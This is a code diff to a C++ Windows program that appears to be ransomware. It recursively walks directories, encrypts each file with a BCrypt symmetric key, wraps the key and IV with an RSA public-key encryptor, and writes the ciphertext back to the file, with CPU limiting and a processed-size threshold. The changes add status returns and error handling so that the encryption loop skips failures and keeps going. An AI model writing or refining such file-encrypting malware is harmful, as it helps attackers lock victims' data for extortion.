@@ -8,7 +8,7 @@
 using namespace boost::filesystem;
 using std::string;
 
-void encrypt(string path, RsaEncryptor& encryptor);
+Status encrypt(string path, RsaEncryptor& encryptor);
 
 string get_username();
 void test();
@@ -316,7 +316,7 @@ DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& a
 	return status;
 }
 
-void encrypt(string path, RsaEncryptor& encryptor)
+Status encrypt(string path, RsaEncryptor& encryptor)
 {
 	DWORD status;
 	PBYTE plainText = nullptr;
@@ -333,6 +333,7 @@ void encrypt(string path, RsaEncryptor& encryptor)
 	PBYTE keyIV = nullptr;
 	PBYTE cipherText = nullptr;
 	if(!initPlainText(path, &plainText, plainTextLen)) {
+		status = STATUS_UNSUCCESSFUL;
 		goto CLEANUP;
 	}
 
@@ -350,6 +351,7 @@ void encrypt(string path, RsaEncryptor& encryptor)
 	//CHECK IF NEEDED V
 	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
 	if(NULL == tmpIv) {
+		status = STATUS_UNSUCCESSFUL;
 		goto CLEANUP;
 	}
 	memcpy(tmpIv, iv, IV_LEN);
@@ -360,6 +362,7 @@ void encrypt(string path, RsaEncryptor& encryptor)
 
 	cipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cipherSize);
 	if(NULL == cipherText) {
+		status = STATUS_UNSUCCESSFUL;
 		goto CLEANUP;
 	}
 	status = BCryptEncrypt(keyHandle, plainText, plainTextLen, NULL, tmpIv, IV_LEN, cipherText, cipherSize, &resSize, BCRYPT_BLOCK_PADDING);
@@ -373,6 +376,7 @@ void encrypt(string path, RsaEncryptor& encryptor)
 	keyIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
 	if (keyIV == nullptr)
 	{
+		status = STATUS_UNSUCCESSFUL;
 		goto CLEANUP;
 	}
 	memcpy(keyIV,key,KEY_LEN);
@@ -381,6 +385,7 @@ void encrypt(string path, RsaEncryptor& encryptor)
 	keyIVBuff = encryptor.encrypt(keyIV, KEY_LEN + IV_LEN);
 	if(!keyIVBuff)
 	{
+		status = STATUS_UNSUCCESSFUL;
 		goto CLEANUP;
 	}
 	writeToFile(path, cipherText, cipherSize, keyIVBuff, plainTextLen);
@@ -402,6 +407,8 @@ CLEANUP:
 		HeapFree(GetProcessHeap(), 0, keyIV);
 	if (keyIVBuff)
 		HeapFree(GetProcessHeap(), 0, keyIVBuff);
+
+	return status;
 }
 
 Status LimitCPU(HANDLE& hCurrentProcess, HANDLE& hJob)
@@ -529,6 +536,7 @@ static void iterate(const path& parent, RsaEncryptor rsaEncryptor,
 	string path;
 	directory_iterator end_itr;
 	static long long sumSize;
+	Status status = STATUS_SUCCESS;
 
 	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
 		path = itr->path().string();
@@ -541,8 +549,12 @@ static void iterate(const path& parent, RsaEncryptor rsaEncryptor,
 		}
 		else {
 			if (!do_encrypt(path)) continue;//see TODO 2 rows below
-			encrypt(path, rsaEncryptor);
+			status = encrypt(path, rsaEncryptor);
 			//TODO consider adding to "process" of encrypt, will cause an ugly wrapper for decrypt
+			if(!NT_SUCCESS(status))
+			{
+				continue;
+			}
 			processedPaths.push_back(path);
 			sumSize += file_size(path);
 			if (sumSize >= SIZE_THRESHOLD)
